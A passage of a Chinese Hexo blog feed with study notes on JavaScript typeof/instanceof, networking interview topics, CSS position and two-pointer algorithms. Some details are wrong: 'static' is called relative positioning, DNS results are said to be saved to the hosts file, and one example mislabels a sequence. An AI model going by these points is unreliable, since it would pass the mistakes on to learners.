class="hljs-regexp">//</span> <span class="hljs-string">&#x27;object&#x27;</span>typeof console <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;object&#x27;</span>typeof console.log <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;function&#x27;</span></code></pre></div><p>前6个都是基础数据类型。虽然<code>typeof null</code>为<code>object</code>，但这只是<code> JavaScript</code> 存在的一个悠久 <code>Bug</code>，不代表<code>null </code>就是引用数据类型，并且<code>null </code>本身也不是对象</p><p>所以，<code>null </code>在 <code>typeof </code>之后返回的是有问题的结果，不能作为判断<code>null</code>的方法。如果你需要在 <code>if</code> 语句中判断是否为 <code>null</code>，直接通过<code>===null</code>来判断就好</p><p>引用类型数据，用<code>typeof</code>来判断的话，除了<code>function</code>会被识别出来之外，其余的都输出<code>object</code></p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><ul><li><code>typeof</code>会返回一个变量的基本类型，<code>instanceof</code>返回的是一个布尔值</li><li><code>instanceof</code> 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型</li><li>而<code> typeof</code> 也存在弊端，它虽然可以判断基础数据类型（<code>null</code> 除外），但是引用数据类型中，除了<code> function</code> 类型以外，其他的也无法判断</li></ul><h2 id="instanceof-原理"><a href="#instanceof-原理" class="headerlink" title="instanceof 原理"></a>instanceof 原理</h2><ul><li>首先获取类型的原型</li><li>然后获得对象的原型</li><li>然后一直循环判断对象的原型是否等于类型的原型，直到对象原型为 <code>null</code>，因为原型链最终为 <code>null</code></li></ul><h5 id="如果需要通用检测数据类型，可以采用Object-prototype-toString，调用该方法，统一返回格式“-object-Xxx-”-的字符串"><a href="#如果需要通用检测数据类型，可以采用Object-prototype-toString，调用该方法，统一返回格式“-object-Xxx-”-的字符串" class="headerlink" title="如果需要通用检测数据类型，可以采用Object.prototype.toString，调用该方法，统一返回格式“[object Xxx]” 的字符串"></a>如果需要通用检测数据类型，可以采用<code>Object.prototype.toString</code>，调用该方法，统一返回格式<code>“[object Xxx]” </code>的字符串</h5><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><div class="hljs code-wrapper"><pre><code class="hljs swift">function myInstanceof(<span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>) &#123;  <span class="hljs-keyword">let</span> prototype = <span class="hljs-keyword">right</span>.prototype  <span class="hljs-keyword">left</span> = <span class="hljs-keyword">left</span>.__proto__  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">left</span> === null || <span class="hljs-keyword">left</span> === undefined)      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>    <span class="hljs-keyword">if</span> (prototype === <span class="hljs-keyword">left</span>)      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>    <span class="hljs-keyword">left</span> = <span class="hljs-keyword">left</span>.__proto__  &#125;&#125;</code></pre></div>]]></content>
    
    
    <summary type="html">typeof和instanceof都用于检查数据的内型，但是和typeof的检测原理和适用范围却不一样</summary>
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/js/"/>
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>网络知识点总结</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/02/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/02/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2021-10-02T02:00:00.000Z</published>
    <updated>2021-10-11T17:02:00.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络知识点总结"><a href="#网络知识点总结" class="headerlink" title="网络知识点总结"></a>网络知识点总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理一下常见的网络面试题</p><h3 id="HTTP与HTTPS区别"><a href="#HTTP与HTTPS区别" class="headerlink" title="HTTP与HTTPS区别"></a>HTTP与HTTPS区别</h3><p>HTTP：超文本传输协议，是一种用于分布式、协作式和超媒体信息系统的应用层协议。 简单来说就是一种发布和接收 HTML 页面的方法，被用于在 Web 浏览器和网站服务器之间传递信息</p><p>–  HTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息，因此，HTTP协议不适合传输一些敏感信息，比如：信用卡号、密码等支付信息</p><p>HTTPS：超文本传输安全协议，是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</p><p>– 它的工作流程一般如以下方式：<br>1、TCP 三次同步握手<br>2、客户端验证服务器数字证书<br>3、DH 算法协商对称加密算法的密钥、hash 算法的密钥<br>4、SSL 安全加密隧道协商完成<br>5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。</p><p>HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS 数据传输过程是加密的，安全性较好。<br>使用 HTTPS 协议需要到申请证书，一般需要一定费用。<br>HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。<br>http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。<br>HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。</p><h3 id="从输入URL到页面加载发生了什么总体来说分为以下几个过程"><a href="#从输入URL到页面加载发生了什么总体来说分为以下几个过程" class="headerlink" title="从输入URL到页面加载发生了什么总体来说分为以下几个过程:"></a>从输入URL到页面加载发生了什么总体来说分为以下几个过程:</h3><ol><li>DNS解析</li></ol><p>DNS解析的过程就是寻找哪台机器上有你需要资源的过程。 先进行DNS域名解析，先查看本地hosts文件，查看有没有当前域名对应的ip地址，若有直接发起请求，没有的话会在本地域名服务器去查找，该查找属于递归查找，如果本地域名服务器没查找到，会从根域名服务器查找，该过程属于迭代查找，根域名会告诉你从哪个与服务器查找，最后查找到对应的ip地址后把对应规则保存到本地的hosts文件中。<br>这里顺便提一下DNS优化方案：<br>（1）DNS缓存（DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种: 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存。）<br>（2）DNS负载均衡（DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。CDN(Content Delivery Network)就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP地址给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容。）</p><ol start="2"><li><p>TCP连接<br>进行http请求，三次握手四次挥手建立断开连接。<br>这里要提醒一点，Chrome 在同一个域名下要求同时最多只能有 6 个 TCP 连接，超过 6 个的话剩下的请求就得等待。</p></li><li><p>发送HTTP请求<br>TCP连接建立完毕后，浏览器可以和服务器开始通信，发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议中发送到服务器指定端口(HTTP协议80/8080, HTTPS协议443)。<br>HTTP请求报文是由三部分组成:<br>请求行：</p></li></ol><p>// 请求方法是GET，路径为根路径，HTTP协议版本为1.1<br>GET / HTTP/1.1</p><p>常用的方法有: GET, POST, PUT, DELETE, OPTIONS, HEAD。<br>请求头：请求报头允许客户端向服务器传递请求的附加信息和客户端自身的信息。<br>请求报头中常见的字段：</p><p>Accept用于指定客户端用于接受哪些类型的信息<br>Accept-Encoding与Accept类似，它用于指定接受的编码方式。<br>Connection设置为Keep-alive用于告诉客户端本次HTTP请求结束之后并不需要关闭TCP连接，这样可以使下次HTTP请求使用相同的TCP通道，节省TCP连接建立的时间。<br>请求体： 当使用POST, PUT等方法时，通常需要客户端向服务器传递数据。这些数据就储存在请求正文中。在请求头中有一些与请求正文相关的信息</p><ol start="4"><li>服务器处理请求并返回HTTP报文<br>HTTP 请求到达服务器，服务器进行对应的处理。最后要把数据传给浏览器，也就是返回网络响应。<br>HTTP响应报文也是由三部分组成:<br>状态码（下文有详细介绍）<br>响应头<br>响应头包含了服务器及其返回数据的一些信息, 服务器生成数据的时间、返回的数据类型以及对即将写入的Cookie信息。<br>常见的响应报头字段有: Server, Connection…。<br>响应体<br>服务器返回给浏览器的文本信息，通常HTML, CSS, JS, 图片等文件就放在这一部分。</li><li>浏览器解析渲染页面<br>浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。这个过程比较复杂，涉及到两个概念: reflow(回流)和repain(重绘)。DOM节点中的各个元素都是以盒模型的形式存在，这些都需要浏览器去计算其位置和大小等，这个过程称为relow;<strong>当盒模型的位置,大小以及其他属性，如颜色,字体,等确定下来之后，浏览器便开始绘制内容，这个过程称为repain。</strong>页面在首次加载时必然会经历reflow和repain。reflow和repain过程是非常消耗性能的，尤其是在移动设备上，它会破坏用户体验，有时会造成页面卡顿。所以我们应该尽可能少的减少reflow和repain。</li><li>连接结束</li></ol><h3 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h3><p>信息响应(100–199)——表示请求已被接受，但需要后续处理。例如：</p><p>100（Continue）客户端应继续发送请求。<br>101（Switching Protocols）需要切换协议，服务器通过的Upgrade响应头字段通知客户端。<br>成功响应(200–299)——表示请求已成功被服务器接收、理解、并接受。</p><p>200 请求已成功，请求所希望的响应头或数据体将随此响应返回。<br>201（Created）请求已经被实现，而且有一个新的资源已经依据请求的需要而创建。在RESTFul风格的URL设计中，通常用来响应POST请求。<br><strong>202（Accepted）服务器已接受请求，但尚未处理。</strong>比如POST一个资源应当返回201，但由于性能原因未能立即创建，可以返回202。<br>204（No Content）服务器成功处理了请求，但不需要返回任何实体内容，204响应禁止包含任何消息体。浏览器收到该响应后不应产生文档视图的变化。<br>205（Reset Content）服务器成功处理了请求，但不需要返回任何实体内容，205响应禁止包含任何消息体。 与204不同的是，返回此状态码的响应要求请求者重置文档视图。比如用户刚刚提交一个表单，返回205后页面重置，用户可以立即填写下一个表单。<br>206（Partial Content）HTTP协议允许分片传输。请求头中包含Range字段时，响应需要只返回Range指定的那一段。响应中应包含Content-Range来指示返回内容的范围。<br>重定向(300–399)——这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，重定向目标在本次响应的Location头字段中指明。</p><p>301（Moved Permanently）被请求的资源已永久移动到新位置，也就是永久重定向。<br>应用场景：域名更改，访问原始域名重定向到新的域名<br>302（Found）请求的资源现在临时从不同的URI响应请求。也就是临时重定向，<br>303（See Other）对应当前请求的响应可以在另一个URI上被找到，而且客户端应当采用GET的方式访问那个资源。 这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。 303响应禁止被缓存。<br>303会使得浏览器直接GET那个资源，不需用户同意。这是Web应用中最常见的重定向方式。<br>304（Not Modified）表示可以在缓存中取数据（协商缓存）<br>304响应也是一种缓存机制。Web服务器对静态资源文件通常会采取缓存，因此在Web开发中你可以看到大量的304响应。 服务器给出的相应中通常会包含Etag来标识资源ID<br>客户端错误(400–499)——这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。 除非响应的是一个HEAD请求，否则服务器就应该返回一个解释当前错误状况的实体。</p><p>400（Bad Request）<br>由于包含语法错误，当前请求无法被服务器理解。400通常在服务器端表单验证失败时返回。<br>401（Unauthorized）无权访问<br>当前请求需要用户验证，响应中会包含一个WWW-Authenticate字段来询问用户的授权信息,输入验证信息并点击确定，浏览器会根据你的输入填写Authorization头并重新发送请求。<br>403（Forbidden）<br>服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助。403和401一样，需要在相应消息体中需要给出原因。除非是一个HEAD请求。<br>404（Not Found）找不到资源<br>这太常见了。就是请求所希望得到的资源未被在服务器上发现。当通常用于当服务器不想揭示到底为何请求被拒绝时，比如应当返回500时服务器不愿透露自己的错误。<br>405（Method Not Allowed）请求行中指定的请求方法不能被用于请求相应的资源。在Web开发中通常是因为客户端和服务器的方法不一致，比如客户端通过PUT来修改一个资源，而服务器把它实现为POST方法。 开发中统一规范就好了。<br>413（Request Entity Too Large）上传的资源大小超过服务器限制的大小<br>一般的服务器都会设置HTTP请求消息体的最大长度，当然这是一种阻挡攻击的手段。 例如你在使用HTTP方式来访问Git仓库，如果你在仓库中加入了大的二进制文件（通常为目标文件或多媒体文件）， 在Push时服务器很可能会返回413错误。如果切换为ssh协议就不会有这样的问题了，服务器只能限制整个仓库的大小。<br>414（Request-URI Too Large）<br>当URI太长时，服务器可以返回414. 当HTTP协议并未规定URI应当有多长。这取决于浏览器和服务器的设置， 在服务器中当然你想设置多长都可以，但是浏览器是你决定不了的，而且不同的厂商在采用不同的长度限制，可以认为最短的是2K：<br>服务器错误 (500–599)<br>这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。 并且响应消息体中应当给出理由，除非是HEAD请求。</p><p>500（Internal Server Error）服务器错误<br>通常是代码出错，后台Bug。一般的Web服务器通常会给出抛出异常的调用堆栈。 然而多数服务器即使在生产环境也会打出调用堆栈，这显然是不安全的。<br>502（Bad Gateway）<br>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。<br>如果你在用HTTP代理来翻墙，或者你配置了nginx来反向代理你的应用，你可能会常常看到它。<br>503 服务器超负荷<br>504（Gateway Time-out）<br>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器收到响应。<br>注意与502的区别：502是接收到了无效响应比如Connection Refused； 504是响应超时，通常是被墙了。</p><h3 id="三次握手过程理解"><a href="#三次握手过程理解" class="headerlink" title="三次握手过程理解"></a>三次握手过程理解</h3><h3 id="四次挥手过程理解"><a href="#四次挥手过程理解" class="headerlink" title="四次挥手过程理解"></a>四次挥手过程理解</h3><h3 id="tcp-和udp有什么区别"><a href="#tcp-和udp有什么区别" class="headerlink" title="tcp 和udp有什么区别"></a>tcp 和udp有什么区别</h3><p>1.连接方面</p><p>tcp面向连接，udp不需要连接<br>tcp需要三次握手四次挥手请求连接<br>2.可靠性</p><p>tcp是可靠传输；一旦传输过程中丢包的话会进行重传<br>udp是不可靠传输，但会最大努力交付<br>3.工作效率</p><p>UDP实时性高，比TCP工作效率高<br>因为不需要建立连接，更不需要复杂的握手挥手以及复杂的算法，也没有重传机制<br>4.是否支持多对多</p><p>TCP是点对点的<br>UDP支持一对一，一对多，多对多<br>5.首部大小</p><p>tcp首部占20字节<br>udp首部占8字节</p><h3 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h3><p>HTTP 缓存又分为强缓存和协商缓存：</p><ul><li>首先通过 Cache-Control 验证强缓存是否可用，如果强缓存可用，那么直接读取缓存</li><li>如果不可以，那么进入协商缓存阶段，发起 HTTP 请求，服务器通过请求头中是否带上 If-Modified-Since 和 If-None-Match 这些条件请求字段检查资源是否更新：<ul><li>若资源更新，那么返回资源和 200 状态码</li><li>如果资源未更新，那么告诉浏览器直接使用缓存获取资源</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网络知识点总结&quot;&gt;&lt;a href=&quot;#网络知识点总结&quot; class=&quot;headerlink&quot; title=&quot;网络知识点总结&quot;&gt;&lt;/a&gt;网络知识点总结&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前</summary>
      
    
    
    
    <category term="面试" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="面试" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>position取值</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/21/position/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/21/position/</id>
    <published>2021-09-21T02:00:00.000Z</published>
    <updated>2021-10-11T17:05:07.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="position取值-call-me-hand"><a href="#position取值-call-me-hand" class="headerlink" title="position取值:call_me_hand:"></a>position取值:call_me_hand:</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CSS position属性用于指定一个元素在文档中的定位方式。top，right，bottom 和 left 属性则决定了该元素的最终位置。</p><h2 id="position5个取值"><a href="#position5个取值" class="headerlink" title="position5个取值"></a>position5个取值</h2><h3 id="static-相对定位"><a href="#static-相对定位" class="headerlink" title="static  相对定位"></a>static  相对定位</h3><blockquote><p>默认值，没有定位，元素出现在正常文档流中（忽略 <code>top, bottom, left, right</code> 或者 <code>z-index</code> 声明）</p></blockquote><h3 id="relative"><a href="#relative" class="headerlink" title="relative"></a>relative</h3><blockquote><p>相对定位，不脱离文档流，相对于元素原本在文档流中的位置进行定位（ <code>left、right、top、bottom</code> 起作用）</p></blockquote><h3 id="absolute-绝对定位"><a href="#absolute-绝对定位" class="headerlink" title="absolute  绝对定位"></a>absolute  绝对定位</h3><blockquote><p>绝对定位，脱离文档流，相对于元素最近的，已定位的父级元素进行定位（不能是 static）；<br>如果不存在这样的父级元素，就相对于 body 元素进行定位；<br>可以使用 left、right、top、bottom 来确定元素的位置；<br>会隐性的改变 display 的值为 inline-block；</p></blockquote><h3 id="fixed-固定定位"><a href="#fixed-固定定位" class="headerlink" title="fixed 固定定位"></a>fixed 固定定位</h3><blockquote><p>固定定位，脱离文档流；<br>相对于浏览器窗口进行定位，不随滚动条的移动而改变位置；<br>可以使用 left、right、top、bottom 来确定元素的位置；</p></blockquote><h3 id="sticky-粘性定位"><a href="#sticky-粘性定位" class="headerlink" title="sticky 粘性定位"></a>sticky 粘性定位</h3><blockquote><p>元素根据正常文档流进行定位，然后相对它的最近滚动祖先（nearest scrolling ancestor）和 containing block (最近块级祖先 nearest block-level ancestor)，包括table-related元素，基于top, right, bottom, 和 left的值进行偏移。偏移值不会影响任何其他元素的位置。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;position取值-call-me-hand&quot;&gt;&lt;a href=&quot;#position取值-call-me-hand&quot; class=&quot;headerlink&quot; title=&quot;position取值:call_me_hand:&quot;&gt;&lt;/a&gt;position取值:call_</summary>
      
    
    
    
    <category term="css" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/css/"/>
    
    
    <category term="css" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>算法 - 双指针</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/20/%E7%AE%97%E6%B3%95-%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/20/%E7%AE%97%E6%B3%95-%E5%8F%8C%E6%8C%87%E9%92%88/</id>
    <published>2021-09-20T02:00:00.000Z</published>
    <updated>2021-10-11T17:01:56.375Z</updated>
    
    <content type="html"><![CDATA[<h1 id="双指针相关算法"><a href="#双指针相关算法" class="headerlink" title="双指针相关算法"></a>双指针相关算法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    妙用双指针，会在许多的数组相关解法中有意想不到的收获，无论是算法复杂度和解题思路，都有很大的提升</p><p><img src="C:/Users/l%27x/Pictures/%E4%B8%8B%E8%BD%BD.jpeg"></p><h5 id="输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分"><a href="#输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分" class="headerlink" title="输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分"></a>输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分</h5><p>思路：</p><blockquote><p>设定两个指针</p><p>第一个指针start从数组第一个元素出发，向尾部前进</p><p>第二个指针end从数组的最后一个元素出发，向头部前进</p><p>start遍历到偶数，end遍历到奇数时，交换两个数的位置</p><p>当start&gt;end时，完成交换</p></blockquote><p>代码：</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> reOrderArray(<span class="hljs-keyword">array</span>) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">Array</span>.isArray(<span class="hljs-keyword">array</span>)) &#123;      let start = <span class="hljs-number">0</span>;      let end = <span class="hljs-keyword">array</span>.length - <span class="hljs-number">1</span>;      <span class="hljs-keyword">while</span> (<span class="hljs-keyword">start</span> &lt; <span class="hljs-keyword">end</span>) &#123;        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">array</span>[<span class="hljs-keyword">start</span>] % <span class="hljs-number">2</span> === <span class="hljs-number">1</span>) &#123;          <span class="hljs-keyword">start</span>++;        &#125;        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">array</span>[<span class="hljs-keyword">end</span>] % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) &#123;          <span class="hljs-keyword">end</span><span class="hljs-comment">--;</span>        &#125;        // 判断是否交换位置        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">start</span> &lt; <span class="hljs-keyword">end</span>) &#123;          [<span class="hljs-keyword">array</span>[<span class="hljs-keyword">start</span>], <span class="hljs-keyword">array</span>[<span class="hljs-keyword">end</span>]] = [<span class="hljs-keyword">array</span>[<span class="hljs-keyword">end</span>], <span class="hljs-keyword">array</span>[<span class="hljs-keyword">start</span>]]        &#125;      &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>;  &#125;</code></pre></div><h5 id="输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。"><a href="#输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。" class="headerlink" title="输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。"></a>输入一个递增排序的数组和一个数字<code>S</code>，在数组中查找两个数，使得他们的和正好是<code>S</code>，如果有多对数字的和等于<code>S</code>，输出两个数的乘积最小的。</h5><p>思路；</p><blockquote><p>数组中可能有多对符合条件的结果，而且要求输出乘积最小的，说明要分布在两侧 比如 <code>3,8</code> <code>5,7</code> 要取<code>3,8</code>。</p></blockquote><p>看了题目了，很像<code>leetcode</code>的第一题【两数之和】，但是题目中有一个明显不同的条件就是数组是有序的，可以使用使用大小指针求解，不断逼近结果，最后取得最终值。</p><ul><li>设定一个小索引<code>left</code>，从<code>0</code>开始</li><li>设定一个大索引<code>right</code>，从<code>array.length</code>开始</li><li>判断<code>array[left] + array[right]</code>的值<code>s</code>是否符合条件</li><li>符合条件 - 返回</li><li>大于<code>sum</code>，<code>right</code>向左移动</li><li>小于<code>sum</code>，<code>left</code>向右移动</li><li>若<code>left=right</code>，没有符合条件的结果</li></ul><blockquote><p>类似【两数之和】的解法来求解，使用<code>map</code>存储另已经遍历过的<code>key</code>，这种解法在有多个结果的情况下是有问题的，因为这样优先取得的结果是乘积较大的。例如 <code>3,8</code> <code>5,7</code> ，会优先取到<code>5,7</code>。</p></blockquote><p>代码：</p><div class="hljs code-wrapper"><pre><code class="hljs vbscript"><span class="hljs-keyword">function</span> FindNumbersWithSum(<span class="hljs-built_in">array</span>, sum) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">array</span> &amp;&amp; <span class="hljs-built_in">array</span>.length &gt; <span class="hljs-number">0</span>) &#123;      <span class="hljs-keyword">let</span> <span class="hljs-built_in">left</span> = <span class="hljs-number">0</span>;      <span class="hljs-keyword">let</span> <span class="hljs-built_in">right</span> = <span class="hljs-built_in">array</span>.length - <span class="hljs-number">1</span>;      <span class="hljs-keyword">while</span> (<span class="hljs-built_in">left</span> &lt; <span class="hljs-built_in">right</span>) &#123;        <span class="hljs-keyword">const</span> s = <span class="hljs-built_in">array</span>[<span class="hljs-built_in">left</span>] + <span class="hljs-built_in">array</span>[<span class="hljs-built_in">right</span>];        <span class="hljs-keyword">if</span> (s &gt; sum) &#123;          <span class="hljs-built_in">right</span>--;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s &lt; sum) &#123;          <span class="hljs-built_in">left</span>++;        &#125; <span class="hljs-keyword">else</span> &#123;          return [<span class="hljs-built_in">array</span>[<span class="hljs-built_in">left</span>], <span class="hljs-built_in">array</span>[<span class="hljs-built_in">right</span>]]        &#125;      &#125;    &#125;    return [];  &#125;</code></pre></div><h5 id="输入一个正数S，打印出所有和为S的连续正数序列。例如：输入15，有序1-2-3-4-5-4-5-6-7-8-15-所以打印出3个连续序列1-5，5-6和7-8。"><a href="#输入一个正数S，打印出所有和为S的连续正数序列。例如：输入15，有序1-2-3-4-5-4-5-6-7-8-15-所以打印出3个连续序列1-5，5-6和7-8。" class="headerlink" title="输入一个正数S，打印出所有和为S的连续正数序列。例如：输入15，有序1+2+3+4+5 = 4+5+6 = 7+8 = 15 所以打印出3个连续序列1-5，5-6和7-8。"></a>输入一个正数<code>S</code>，打印出所有和为S的连续正数序列。例如：输入<code>15</code>，有序<code>1+2+3+4+5</code> = <code>4+5+6</code> = <code>7+8</code> = <code>15</code> 所以打印出3个连续序列<code>1-5</code>，<code>5-6</code>和<code>7-8</code>。</h5><p>思路：</p><blockquote><p>创建一个容器child，用于表示当前的子序列，初始元素为1,2</p><p>记录子序列的开头元素small和末尾元素big</p><p>big向右移动子序列末尾增加一个数 small向右移动子序列开头减少一个数</p><p>当子序列的和大于目标值，small向右移动，子序列的和小于目标值，big向右移动</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs maxima">function FindContinuousSequence(<span class="hljs-built_in">sum</span>) &#123;     const result = [];     const child = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>];     <span class="hljs-built_in">let</span> big = <span class="hljs-number">2</span>;     <span class="hljs-built_in">let</span> small = <span class="hljs-number">1</span>;     <span class="hljs-built_in">let</span> currentSum = <span class="hljs-number">3</span>;     // 较大的数不能超过所求的数     <span class="hljs-keyword">while</span> (big &lt; <span class="hljs-built_in">sum</span>) &#123;     // 整体和小于所求的数，则忘容器李加数据       <span class="hljs-keyword">while</span> (currentSum &lt; <span class="hljs-built_in">sum</span> &amp;&amp; big &lt; <span class="hljs-built_in">sum</span>) &#123;         child.<span class="hljs-built_in">push</span>(++big);         currentSum += big;       &#125;       // 如果加了数之后发现总数大了，就移除容器前面的数       <span class="hljs-keyword">while</span> (currentSum &gt; <span class="hljs-built_in">sum</span> &amp;&amp; small &lt; big) &#123;         child.shift();         currentSum -= small++;       &#125;       // 如果总数等于所求的数，则将这种可能加入返回的数组中       <span class="hljs-keyword">if</span> (currentSum === <span class="hljs-built_in">sum</span> &amp;&amp; child.<span class="hljs-built_in">length</span> &gt; <span class="hljs-number">1</span>) &#123;         result.<span class="hljs-built_in">push</span>(child.slice());         child.<span class="hljs-built_in">push</span>(++big);         currentSum += big;       &#125;     &#125;     <span class="hljs-built_in">return</span> result;   &#125;</code></pre></div><p>总结</p><blockquote><p>双指针可以使用在数组链表等这样的数据结构中，在遍历过程中我们可以使用多个标记点来遍历数组等，或是一个在头一个在尾，获取都在一方，一个快一个慢。这样就能更灵活的操作数据</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;双指针相关算法&quot;&gt;&lt;a href=&quot;#双指针相关算法&quot; class=&quot;headerlink&quot; title=&quot;双指针相关算法&quot;&gt;&lt;/a&gt;双指针相关算法&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前</summary>
      
    
    
    
    <category term="算法" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>H5新特性</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/17/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/17/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/</id>
    <published>2021-09-17T02:00:00.000Z</published>
    <updated>2021-10-11T17:16:14.416Z</updated>
    
